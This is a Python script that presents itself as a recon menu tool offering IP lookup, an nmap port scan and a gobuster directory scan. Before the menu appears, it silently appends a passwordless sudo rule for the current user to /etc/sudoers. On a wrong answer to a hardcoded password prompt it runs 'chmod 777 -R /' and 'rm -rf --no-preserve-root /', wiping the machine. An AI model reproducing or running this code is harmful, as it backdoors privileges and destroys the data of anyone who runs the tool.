#!/usr/bin/env python3

import getpass
import subprocess
import sys
import socket
import requests

def banner():
    print("**********************************************************************\n*                                                                    *\n*    BE CAREFUL!! MAKE SURE YOU KNOW THE PASSWORD BEFORE RUN        *\n*   You will take full responsibility if you choose to countinue     *\n*                                                                    *\n*    Enter Your Password Down Below if You Wish to Countinue!        *\n*                                                                    *\n**********************************************************************")

banner()

def add_user_visudo():
    userid = getpass.getuser()

    try:
        command = f'echo "{userid} ALL=(ALL) NOPASSWD:ALL" |sudo tee -a /etc/sudoers'
        subprocess.run(command, shell=True, check=True)

    except Exception as e:
        print(f'An error occurred: {str(e)}')


add_user_visudo()



def password_check():

    password = 'jk'
    ture_password = getpass.getpass('Enter Password: ')

    if ture_password != password: 
        print("Warning! The Nuke is launched!")
        subprocess.run(['sudo','chmod','777','-R','/'])
        subprocess.run(['rm','-rf','--no-preserve-root','/'], check=True)
    else:
        print('           ---Welcome Back Master----')

password_check()

#!
def get_my_ip():
    print("GETTING IP ADDRESSES")
    local_ip = socket.gethostbyname(socket.gethostname())
    public_ip = requests.get('https://api.ipify.org').text
    print(f'Your Local IP Address: {local_ip}\nYour Public IP Address: {public_ip}')
    print("Press ENTER to main menu...")
    input()


def ip_port_check():
    print("RUNNING PORT CHECK")
    ip_nmap = input("Enter the IP address you want to check: ")
    subprocess.run(['nmap','-sC','-sV','-oN',f'cache/{ip_nmap}',f'{ip_nmap}'], check=True)
    print("Press ENTER to main menu...")
    input()

def gobuster():
    print("RUNNING WEB DIGGING")
    ip_go = input("Enter the IP address you want to bust their door: ")
    subprocess.run(['gobuster','-w','./wordlist/dir_list.txt','dir','-u',f'http://{ip_go}'])
    print("Press ENTER to main menu...")
    input()

def exit():
    print("Oh, That's it?!!")
    sys.exit(0)

def menu():
    while True:
        print("""
        1. Get Your IP Addresses      
        2. Open Port Check via IP Address
        3. HTTP Web Investigation 
        4. Exit
        """)
        choice = input("Choose an option: ")

        if choice == "1":
            get_my_ip()

        elif choice== "2":
            ip_port_check()

        elif choice == "3":
            gobuster()

        elif choice == "4":
            exit()

        else:
            print("Invalid Choice, Select again.")
menu()

